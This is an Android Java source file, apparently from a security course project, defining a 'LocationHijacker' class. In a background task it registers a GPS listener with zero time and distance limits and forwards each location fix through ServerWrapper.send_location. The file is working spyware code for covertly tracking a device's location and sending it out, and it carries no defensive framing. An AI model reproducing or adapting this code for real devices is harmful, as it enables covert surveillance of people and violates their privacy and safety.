package com.seginfo.tp.seginfotp;

import android.app.Activity;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Looper;
import android.util.Log;

/**
 * Created by juan on 27/06/15.
 */
public class LocationHijacker  extends AsyncTask<Activity, Void, Integer> {

    Activity _act;

    @Override
    protected Integer doInBackground(Activity... args) {
        _act = args[0];
        obtain_location();
        return 0;
    }

    private void obtain_location(){
        Log.i("LocationHijacker", "obtaining location");
        //String locationProvider = LocationManager.NETWORK_PROVIDER;
        // Or, use GPS location data:
        String locationProvider = LocationManager.GPS_PROVIDER;

        // Acquire a reference to the system Location Manager
        LocationManager locationManager = (LocationManager) _act.getSystemService(Context.LOCATION_SERVICE);

        // Define a listener that responds to location updates
        LocationListener locationListener = new LocationListener() {
            public void onLocationChanged(Location location) {
                // Called when a new location is found by the location provider.
                ServerWrapper.send_location(location);
            }

            public void onStatusChanged(String provider, int status, Bundle extras) {}

            public void onProviderEnabled(String provider) {}

            public void onProviderDisabled(String provider) {}
        };

        Looper.prepare();
        // Register the listener with the Location Manager to receive location updates
        locationManager.requestLocationUpdates(locationProvider, 0, 0, locationListener);

    }

}
